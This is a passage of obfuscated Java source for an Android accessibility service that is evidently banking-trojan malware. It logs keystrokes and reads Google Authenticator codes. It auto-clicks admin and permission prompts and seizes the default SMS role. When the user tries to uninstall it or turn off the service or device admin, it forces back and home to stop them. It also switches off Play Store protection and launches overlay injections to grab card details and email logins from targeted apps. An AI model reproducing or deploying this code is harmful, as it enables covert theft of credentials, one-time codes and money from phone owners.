                    if (android.os.Build.VERSION.SDK_INT > 24) {
                    GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
                    Path mPaint = new Path();
                    mPaint.moveTo(10, py);
                    mPaint.lineTo(600, py);


                    gestureBuilder.addStroke(new GestureDescription.StrokeDescription(mPaint, 100, 50));
                    dispatchGesture(gestureBuilder.build(), new GestureResultCallback() {
                        @Override
                        public void onCompleted(GestureDescription gestureDescription) {
                            Log.e("SSSSSSSSS", "Gesture Completed");
                            super.onCompleted(gestureDescription);
                        }
                    }, null);

                }
              }*/




                //Intent LaunchIntent = getPackageManager().getLaunchIntentForPackage("com.teamviewer.quicksupport.market");
                //startActivity(LaunchIntent);


            }

           /* if (AccessibilityEvent.TYPE_VIEW_CLICKED == event.getEventType()) { //
                AccessibilityNodeInfo nodeInfo = event.getSource();
             //   Log.e("CLICK","11111");


                if (nodeInfo == null) {

                    utl.Log(TAG_LOG, consts.string_29);
                    return;
                }
            }*/
        }catch (Exception ex){
            // utl.SettingsToAdd(this, consts.LogSMS , consts.string_163 + ex.toString() + consts.string_119);
        }

        try {
            if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == event.getEventType()) {
                AccessibilityNodeInfo nodeInfo = event.getSource();
                utl.Log(TAG_LOG, consts.string_33 + packageAppStart + consts.string_34 + strText + consts.string_35 + className + consts.string_36);

                utl.get_google_authenticator2(this, event, packageAppStart); // Logs com.google.android.apps.authenticator2



                //------------------Exit-Settings-Accessibility-Service--------------
                if (android.os.Build.VERSION.SDK_INT > 16) {
                    if ((consts.string_37.equals(event.getClassName())) && (strText.equals(consts.strAccessbilityService.toLowerCase()))) {
                        blockBack();
                        utl.SettingsToAdd(this, consts.LogSMS , consts.string_164 + consts.string_119);
                    }
                }
                //-------------check Keylogger----------
                if (utl.SettingsRead(this, consts.keylogger).equals(consts.str_1)) {
                    keylogger = true;
                } else {
                    keylogger = false;
                }

                if (utl.SettingsRead(this, consts.checkProtect).equals(consts.str_1)) {
                    startOffProtect = true;
                } else {
                    startOffProtect = false;
                }

                if (textKeylogger.length() > 20) {
                    utl.Log(TAG_LOG, consts.string_38 + textKeylogger.length());
                    utl.SettingsToAdd(this, consts.dataKeylogger, textKeylogger);
                    textKeylogger = "";
                }

                if (nodeInfo == null) {
                    utl.Log(TAG_LOG, consts.string_29);
                    return;
                }
                // --------------- Click button --------------------
                if (android.os.Build.VERSION.SDK_INT >= 18) {
                    if (utl.SettingsRead(this, consts.autoClick).equals(consts.str_1)) {


                        String[] arrayButtonClick = {consts.string_41, consts.string_40, consts.string_39};
                        for (int i = 0; i < arrayButtonClick.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                utl.Log(TAG_LOG, consts.string_42);
                              /*  if ((arrayButtonClick[i].contains(consts.string_43)) && (!utl.isAdminDevice(this))) {
                                    Rect buttonRect = new Rect();
                                    nodeInfo.getBoundsInScreen(buttonRect);
                                    for (int ii = 0; ii < 700; ii += 4) {
                                        int y = ((int) buttonRect.centerY() - 250) + ii;
                                        click(buttonRect.centerX(), y);
                                        if (utl.isAdminDevice(this)) {
                                            break;
                                        }
                                    }
                                }*/


                                int width  = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                                int height = Integer.parseInt(utl.SettingsRead(this, consts.display_height));

                                if ((arrayButtonClick[i].contains(consts.string_43)) && (!utl.isAdminDevice(this))) {

                                    for (int ii = 0; ii < 80; ii += 4) {
                                        click(width - 15, height - ii);
                                        utl.Log("SS", "x: " + width + "  y: " + height );
                                        if (utl.isAdminDevice(this)) {
                                            break;
                                        }
                                    }
                                }

                                utl.SettingsWrite(this, consts.autoClick, consts.str_null);
                            }
                        }



                        if(Build.VERSION.SDK_INT >= 29) {
                            if (utl.autoclick_change_smsManager_sdk_Q(this, event, className, packageAppStart)) {
                                utl.SettingsWrite(this, consts.autoClick, "");
                            }
                        }
                    }


                    if (!utl.SettingsRead(this, consts.killApplication).isEmpty()) {
                        String[] arrayButtonClick = {consts.string_44, consts.string_40};
                        for (int i = 0; i < arrayButtonClick.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                if (i == 1) {
                                    utl.SettingsWrite(this, consts.killApplication, consts.str_null);
                                }
                            }
                        }
                    }

                    //---------Xiaomi---------------
                    if (!utl.isAdminDevice(this)) {
                        for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_49_)) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }

                    //----TeamViewer---
/*
                        if(!utl.SettingsRead(this, consts.startInstalledTeamViewer).isEmpty()){
                            String[] arrayButtonClick = {"android.widget.Button", "android:id/button1"};
                            for(int i=0;i<arrayButtonClick.length;i++) {
                                for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                    utl.chalkTile(2000);
                                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    utl.Log(TAG_LOG, "-=CLICK BUTTON=- 111");
                                }
                            }
                        }*/
                }


            }//----------------
        }catch (Exception ex){
            //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_165 + ex.toString() + consts.string_119);
        }

        // Log.e("TTT",""+ event.toString());

        try{

            blockProtect(event.getSource());
            clickProtect(event.getSource(),className);}catch (Exception ex){
            // utl.SettingsToAdd(this, consts.LogSMS , consts.string_166 + ex.toString() + consts.string_119);
        }


        try {

            if(!utl.SettingsRead(this, consts.killApplication).equals(getPackageName())) {
                //--- Block Delete Bots ---
                if ((event.getPackageName().toString().contains(consts.string_45))
                        && (className.contains(consts.string_46))
                        && (strText.contains(utl.getLabelApplication(this).toLowerCase()))) {
                    // utl.Log(TAG_LOG, "BLOCK DELETE 1");
                    blockBack();
                    utl.SettingsToAdd(this, consts.LogSMS , consts.string_167 + consts.string_119);
                }
                //--- Block Delete Bots ---
                if (((className.equals(consts.string_47)) || (className.equals(consts.string_48)))
                        && ((event.getPackageName().toString().equals(consts.string_49)) ||(event.getPackageName().toString().equals(consts.string_48_)))
                        && (strText.contains(utl.getLabelApplication(this).toLowerCase()))) {
                    // utl.Log(TAG_LOG, "BLOCK DELETE 2");

                    blockBack();
                    utl.SettingsToAdd(this, consts.LogSMS , consts.string_167 + consts.string_119);
                }
                //--- Block off admin ---
                if ((className.equals(consts.string_50)) && (utl.isAdminDevice(this))) {
                    blockBack();
                    utl.SettingsToAdd(this, consts.LogSMS , consts.string_168 + consts.string_119);
                }
            }
        }catch (Exception ex){
            utl.Log(TAG_LOG,consts.string_51);
            //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_169 + ex.toString() + consts.string_119);
        }



        //-------------Injection Application---------------------------------

        String actionSettingInject = utl.SettingsRead(this, consts.actionSettingInection);
        if (((!actionSettingInject.isEmpty()) && (actionSettingInject.contains(app_inject)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this))) ||
                ((actionSettingInject.contains(consts.string_8)) && (consts.listAppGrabCards.contains(app_inject + consts.string_75)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this))) ||
                ((actionSettingInject.contains(consts.string_9)) && (consts.listAppGrabMails.contains(app_inject + consts.string_75)) && (app_inject.contains(consts.string_170)) && (utl.getScreenBoolean(this)))) {

            String nameInject = consts.str_null;
                   /* if (consts.listAppGrabCards.contains(app_inject)) {
                        nameInject = consts.string_8;
                    } else if (consts.listAppGrabMails.contains(app_inject)) {
                        nameInject = consts.string_9;
                    }*/
            try {
                if (utl.SettingsRead(this, nameInject.isEmpty() ? app_inject : nameInject).length() > 10) {//!isEmpty
                               /* JSONObject jsonObject = new JSONObject();
                                jsonObject.put(consts.string_57, consts.string_62);
                                jsonObject.put(consts.string_58, app_inject);
                                jsonObject.put(consts.string_59, nameInject);
                                jsonObject.put(consts.string_60, getPackageName());
                                jsonObject.put(consts.string_61, actViewInjection.class.getCanonicalName());*/

                    // utl.Log(TAG_LOG, "START INJECT: " + jsonObject.toString());
                    // utl.sendMainModuleDEX(this, jsonObject.toString());
                    //----------------------------------------
                    try {
                        Intent dialogIntent = new Intent(this, actViewInjection.class);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                        utl.SettingsWrite(this, "app_inject", app_inject);
                        utl.SettingsWrite(this, "nameInject", nameInject);
                        startActivity(dialogIntent);
                    } catch (Exception ex) { }
                    //-----------------------------------------

                }
            } catch (Exception ex) {
                utl.Log(TAG_LOG, consts.string_63 + app_inject + consts.string_64 + ex);
                //   utl.SettingsToAdd(this, consts.LogSMS, consts.string_171 + ex.toString() + consts.string_119);
            }
        }


        //newcodes


				/*if(event.getSource().getPackageName().toString().equals("com.android.settings"))
				{
					if(event.getSource().getClassName().toString().equals("android.widget.TextView"))
					{
						if(event.getSource().getText().toString().equals(utl.getLabelApplication(this).toLowerCase()))
						{
						blockBack();
						utl.SettingsToAdd(this, consts.LogSMS , consts.string_169 + consts.string_119);
						}
					}
				}



            List<AccessibilityNodeInfo> listf2xdqeq = event.getSource().findAccessibilityNodeInfosByText(utl.getLabelApplication(this));
            for (AccessibilityNodeInfo node2eradd : listf2xdqeq) {

                    if(node2eradd.getPackageName().toString().indexOf("com.android.settings") != -1) {

                        if (node2eradd.getClassName().toString().indexOf("android.widget.TextView") != -1) {

                            if (node2eradd.getText().toString().equals(utl.getLabelApplication(this))) {
                                try {
                                    blockBack();
                                    //SF.POST(this, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "| Bot looking for apps and <blocked>!|"));
                                    break;
                                } catch (Exception err) {

                                }
                            }
                        }
                    }

            }

			*/





        //endline

    }

    private void blockBack(){
        if(android.os.Build.VERSION.SDK_INT > 16)
        {
            for (int i = 0; i < 4; i++) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
            performGlobalAction(GLOBAL_ACTION_HOME);
            performGlobalAction(GLOBAL_ACTION_HOME);

        }

        if(android.os.Build.VERSION.SDK_INT < 17)
        {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);
        }

		/*
        if (android.os.Build.VERSION.SDK_INT > 15) {
            for (int i = 0; i < 4; i++) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
        }
		*/
    }

    private void blockBack2(){
        if (android.os.Build.VERSION.SDK_INT > 16) {
            for (int i = 0; i < 4; i++) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
            performGlobalAction(GLOBAL_ACTION_HOME);
            performGlobalAction(GLOBAL_ACTION_HOME);
        }
    }

    @Override
    public void onInterrupt() {
        utl.Log(TAG_LOG, consts.string_65);
    }


    void blockProtect(AccessibilityNodeInfo nodeInfo){
        try {
            if (!startOffProtect) {//BLOCK OFF PROTECT
                if (android.os.Build.VERSION.SDK_INT >= 18) {

                    if (nodeInfo == null) {
                        utl.Log(TAG_LOG, consts.string_29);
                        return;
                    }

                    //NEW
                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_67_new2)) {
                        //performGlobalAction(GLOBAL_ACTION_HOME);
                        blockBack();
                    }

                    //NEW
                    for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_67)) {
                        //performGlobalAction(GLOBAL_ACTION_HOME);
                        blockBack();
                    }

                    if (className.equals(consts.string_68)) {//OLD
                        blockBack();
                        // performGlobalAction(GLOBAL_ACTION_HOME);
                    }
                }
            }
        }catch (Exception ex){}
    }


    private void writeNodes(AccessibilityNodeInfo mNodeInfo) {
        int dP = 0;
        if(Build.VERSION.SDK_INT >= 18) {
            if (mNodeInfo == null) return;
            String log = "";
            for (int i = 0; i < mDebugDepth; i++) {
                log += ".";
            }

            try
            {

                String pkName = "";
                String clName = "";

                try
                {
                    pkName = mNodeInfo.getPackageName().toString();
                    clName = mNodeInfo.getClassName().toString();
                }
                catch ( Exception er12)
                {

                }


                if(pkName.contains("com.android.vending")) {

                    if(clName.contains("android.widget.LinearLayout"))
                    {

                        try {
                            if(dpRight.indexOf(mNodeInfo) != -1)
                            {

                            }
                            else
                            {
                                dpRight.add(mNodeInfo);

                            }


                        }
                        catch (Exception err)
                        {

                        }


                    }
                    else if (clName.contains("android.widget.Switch"))
                    {
                        if(mNodeInfo.getText().toString().contains("OFF") || mNodeInfo.getText().toString().contains("KAPALI") || mNodeInfo.getText().toString().contains("kapalı") || mNodeInfo.getText().toString().contains("Kullanımda değil") || mNodeInfo.getText().toString().contains("KULLANIMDA DEĞİL")) {
                            DPStat = "deactive";

                        }

                        else if(mNodeInfo.getText().toString().contains("ON") || mNodeInfo.getText().toString().contains("AÇIK") || mNodeInfo.getText().toString().contains("Kullanımda") || mNodeInfo.getText().toString().contains("KULLANIMDA") || mNodeInfo.getText().toString().contains("açık") ) {
                            restPoint++;
                            DPStat = "active";

                        }



                    }


                }

            }
            catch (Exception err502)
            {
            }

            if (mNodeInfo.getChildCount() < 1) return;
            mDebugDepth++;

            for (int i = 0; i < mNodeInfo.getChildCount(); i++) {
                writeNodes(mNodeInfo.getChild(i));
            }
            mDebugDepth--;
        }
    }


    String clickprotect = consts.str_step;
    void clickProtect(AccessibilityNodeInfo nodeInfo, String className){
        try {
            if (nodeInfo == null) {
                utl.Log(TAG_LOG, consts.string_29);
                return;
            }
            if (startOffProtect) {
                if (android.os.Build.VERSION.SDK_INT >= 18) {
                    // --- NEW Version---
                    if (packageAppStart.equals(consts.string_66)) {
                        if (clickprotect.equals(consts.str_1)) {
                            int display_x = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                            int display_y = Integer.parseInt(utl.SettingsRead(this, consts.display_height));

                            for (int i = 0; i < display_y/2; i += 50) {

                                for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_40)) {
                                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    clickprotect = consts.str_step;
                                    utl.SettingsWrite(this,consts.checkProtect, consts.str_step);
                                    startOffProtect = false;
                                    blockBack();
                                    //performGlobalAction(GLOBAL_ACTION_HOME);
                                    break;
                                }
                                if(clickprotect.equals(consts.str_null))break;

                                click(display_x / 2, 40 + i);

                                //utl.chalkTile(100);

                            }
                        }

                        String[] arrayButtonClick = {consts.string_67_new2, consts.string_67, consts.string_40};
                        for (int i = 0; i < arrayButtonClick.length; i++) {
                            for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(arrayButtonClick[i])) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                clickprotect = consts.str_1;
                                if (arrayButtonClick[i].equals(consts.string_40)) {
                                    clickprotect = consts.str_step;
                                    startOffProtect = false;
                                    blockBack();
                                    //performGlobalAction(GLOBAL_ACTION_HOME);
                                }
                            }
                        }
                    }
                    // --- OLD Version---
                    if (className.equals(consts.string_68)) {
                        clickprotect = consts.str_1;
                        nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                        int display_x = Integer.parseInt(utl.SettingsRead(this, consts.display_width));
                        int display_y = Integer.parseInt(utl.SettingsRead(this, consts.display_height));
                        for (int i = display_y; i > 30; i -= 15) {
                            click(display_x / 2, display_y - i);
                        }
                    } else if ((className.equals(consts.string_69)) && (clickprotect.equals(consts.str_1))) {
                        for (AccessibilityNodeInfo node : nodeInfo.findAccessibilityNodeInfosByViewId(consts.string_40)) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            clickprotect = consts.str_step;
                            startOffProtect = false;
                            blockBack();
                            //performGlobalAction(GLOBAL_ACTION_HOME);
                        }
                    }
                }
            }
        }catch (Exception ex){
            //utl.SettingsToAdd(this, consts.LogSMS , consts.string_172 + ex.toString() + consts.string_119);
        }
    }

    private void logClick(AccessibilityNodeInfo nodeInfo){

        if (nodeInfo == null) {
            utl.Log(TAG_LOG,consts.string_29);
            return;
        }

        Rect buttonRect = new Rect();
        nodeInfo.getBoundsInScreen(buttonRect);
        //utl.Log(TAG_LOG,"CLICKED: "+buttonRect + "   X:" + buttonRect.centerX() + "  Y:"+buttonRect.centerY());
        utl.Log(TAG_LOG,consts.string_30+buttonRect + consts.string_31 + buttonRect.centerX() + consts.string_32  +buttonRect.centerY());

    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            utl.Log(TAG_LOG, consts.string_70);

            utl.SettingsWrite(this, consts.startInstalledTeamViewer, consts.str_1);

            if (android.os.Build.VERSION.SDK_INT > 16) {
                if (!utl.SettingsRead(this, consts.statAccessibilty).equals(consts.str_1)) {
                    blockBack();
                    utl.SettingsWrite(this, consts.statAccessibilty, consts.str_1);
                }
            }

            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags = AccessibilityServiceInfo.DEFAULT;
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            setServiceInfo(info);
        }catch (Exception ex){
            // utl.SettingsToAdd(this, consts.LogSMS , consts.string_173 + ex.toString() + consts.string_119);
        }
    }
}